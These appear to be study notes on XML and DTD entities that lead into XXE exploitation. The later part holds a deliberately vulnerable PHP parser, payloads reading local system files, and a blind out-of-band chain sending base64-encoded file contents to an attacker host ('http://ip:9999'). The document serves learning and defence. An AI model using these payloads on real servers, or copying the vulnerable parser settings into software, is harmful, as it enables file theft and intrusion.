https://cloud.tencent.com/developer/article/2130148
A popular marking language.
- Structural
- applications:
	- mark the data;
	- define the data type.
A source language that allows users to define their own marking language.
- It is designed for:
	- data transmitting and storage
	- tree-like structure.
	- It consists of labels purely.
- Furthermore, it is used in:
	- configuration files;
	- documents (OOXML, ODF, PDF, RSS, etc..)
	- Images (SVG, EXIF)
	- Network protocol:
		- WebDAV
		- CalDAV
		- XMLRPC
		- SOAP
		- XMPP
		- SAML
		- XACML
		- etc.
- XML Structure
	- XML declaration
	- DTD (document type definitions) (optional)
		- Internal declaration entity format.
			- `<!ENTITY entity_name"entity_value">`
		- External declaration entity format.
			- `<!ENTITY entity_nameSYSTEM"URL">`
	- Document elements
		- ![[54f21654b2b6fbd6c67c57eebf1bc63e.png]]
# XML Doc modules
## Elements
```XML
<body>body text in between</body> 
<message>some message in between</message>
```
- The basic modules of XML & HTML.
## Attributes
```XML
<img src="computer.gif" />
```
- The attributes can offer the extra information.
## Entities
- The entity is a variable which defines the normal text.
## PCDATA
parsed character data
## CDATA
character data that won't be parsed.
# DTD (document type definitions)
- DTD defines XML legal building blocks.
- Declare internally.
	- `<!DOCTYPE 根元素 [元素声明]>`
- Declare externally.
	- `<!DOCTYPE 根元素 SYSTEM "文件名">`
```XML
<?xml version="1.0"?>
<!DOCTYPE note [
	<!ELEMENT note (to,from,heading,body)>
	<!ELEMENT to      (#PCDATA)>
	<!ELEMENT from    (#PCDATA)> 
	<!ELEMENT heading (#PCDATA)>
	<!ELEMENT body    (#PCDATA)> 
]>
<note>
	<to>George</to>
	<from>John</from>
	<heading>Reminder</heading>
	<body>Don't forget the meeting!</body>
</note>
```

```XML
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
	<to>George</to>
	<from>John</from>
	<heading>Reminder</heading>
	<body>Don't forget the meeting!</body>
</note>
```
The `note.dtd` is:
```XML
<!ELEMENT note (to,from,heading,body)>
	<!ELEMENT to      (#PCDATA)>
	<!ELEMENT from    (#PCDATA)>
	<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```
# DTD Entity
- Define the variables that reference the shortcuts of the normal texts or special characters.
# Internal & External
## Internal Entity
`<!ENTITY eviltest "eviltest">`
```XML
<?xml version="1.0"?>
<!DOCTYPE test [
	<!ENTITY writer "Bill Gates">
	<!ENTITY copyright "Copyright W3School.com.cn">
]>
<test>&writer;&copyright;</test>
```
## External Entity
Any changes made to the referenced resource are automatically updated in the document, which is convenient.
However, convenience is always the enemy of security.
```XML
<?xml version="1.0"?>
<!DOCTYPE test [ 
	<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"> 
	<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>
```
# Normal Entity & Parameter Entity
## Normal Entity
- The way to reference the entity. `&entity_name`
- Define the entity in the DTD, and reference it in the XML document.
```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
	<!ENTITY file SYSTEM "file:///c:/windows/win.ini">
]>
<updateProfile>
	<firstname>Joe</firstname>
	<lastname>&file;</lastname>
	...
</updateProfile>
```
## Parameter Entity
- The way to reference the entity. `% entity_name`
-  Define and reference the entity in the DTD.
- Parameter entity can also be referenced externally.
```XML
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>">
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd">
%an-element; %remote-dtd;
```
# XXE Bug Utilization
## An echo reads sensitive information
`xml.php` with problems:
```PHP
<?php
	libxml_disable_entity_loader (false);
	$xmlfile = file_get_contents('php://input');
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);
	echo $creds;
?>
```
### Declare through the DTD external entity directly.
Payload:
```XML
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds [
	<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini">
]>
<creds>&goodies;</creds>
```
If it's bugging, we can use CDATA and parameter entity instead:
```XML
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
	<!ENTITY % start "<![CDATA[">
	<!ENTITY % goodies SYSTEM "file:///d:/test.txt">
	<!ENTITY % end "]]>">
	<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
	%dtd;
]> 
<roottag>&all;</roottag>
```

`test.txt`:
![[Pasted image 20241109232141.png]]
`evil.dtd`:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
```
## No Echo to read sensitive files (Blind OOB XXE)
Even if the server may have XXEs, it will not return any response to the attacker's browser or proxy.
We can use the Blind XXE bug to build an out-of-band data (OOB) channel to read data.
`xml.php` with problems:
```PHP
<?php
	libxml_disable_entity_loader (false);
	$xmlfile = file_get_contents('php://input');
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
?>
```
`test.dtd`:
```XML
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'>">
```
Payload:
```XML
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>
```
- Call `%remote` first.
- Request the `test.dtd` from the remote server after calling.
- Call `%int` in `test.dtd`.
	- Call `%file` to capture the sensitive file from the server.
	- Send the result of `%file` into `%send`.
- Call `%send` to send the data we have read to our remote VPS.
![[311933150c46bf702bdff45bcbdd16a2.png]]
![[ffae731dd92c1675acd09c1a16b917fa.png]]
